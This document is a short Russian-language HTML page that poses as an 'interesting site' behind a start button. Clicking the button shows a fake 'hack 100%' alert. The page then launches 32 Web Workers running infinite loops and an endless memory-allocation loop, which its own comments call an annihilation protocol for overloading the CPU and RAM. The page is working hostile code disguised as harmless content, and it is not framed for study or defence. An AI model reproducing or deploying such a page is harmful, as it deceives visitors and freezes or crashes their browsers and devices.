<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <title>Интересный сайт</title>
    <style>
        body { margin: 0; overflow: hidden; background-color: #f0f0f0; }
        .center-container { display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; font-family: Arial, sans-serif; }
        #intro { font-size: 24px; }
        #startButton { padding: 15px 30px; font-size: 20px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="container" class="center-container">
        <div id="intro"><h1>Нажмите, чтобы увидеть кое-что интересное</h1><button id="startButton">Начать</button></div>
    </div>
    
    <script id="worker-script" type="javascript/worker">
        self.onmessage = function() { while (true) {} };
    </script>

    <script>
        const startButton = document.getElementById('startButton');
        const intro = document.getElementById('intro');

        // --- САМАЯ РАЗРУШИТЕЛЬНАЯ ФУНКЦИЯ ---
        function startUltimateAnnihilation() {
            console.log("ЗАПУСК ФИНАЛЬНОГО ПРОТОКОЛА УНИЧТОЖЕНИЯ");
            
            // 1. Немедленная, тотальная атака на CPU
            try {
                const workerCount = 32; // Запускаем 32 потока, игнорируя кол-во ядер
                const workerScript = document.getElementById('worker-script').textContent;
                const blob = new Blob([workerScript], { type: 'javascript/worker' });
                const workerUrl = URL.createObjectURL(blob);
                for (let i = 0; i < workerCount; i++) {
                    new Worker(workerUrl).postMessage('start');
                }
                console.log(`Запущено ${workerCount} потоков для тотальной перегрузки CPU.`);
            } catch (e) {
                console.error('Не удалось запустить Workerы:', e);
            }
            
            // 2. Сразу же - сверхагрессивная атака на RAM
            let memoryHog = [];
            while (true) {
                 // Создаем сложные, вложенные объекты, чтобы максимально нагрузить движок JS
                 memoryHog.push(new Array(1_000_000).fill({
                    a: Math.random(),
                    b: [new Array(10).fill('x')]
                 }));
            }
        }

        // Слушатель нажатия на кнопку "Начать"
        startButton.addEventListener('click', () => {
            intro.style.display = 'none';
            document.body.style.backgroundColor = '#000';
            
            // Показываем последнее предупреждение
            alert("взлом 100%");
            
            // СРАЗУ ПОСЛЕ НАЖАТИЯ "ОК" НАЧИНАЕТСЯ АД
            startUltimateAnnihilation();
        });
    </script>

</body>
</html>
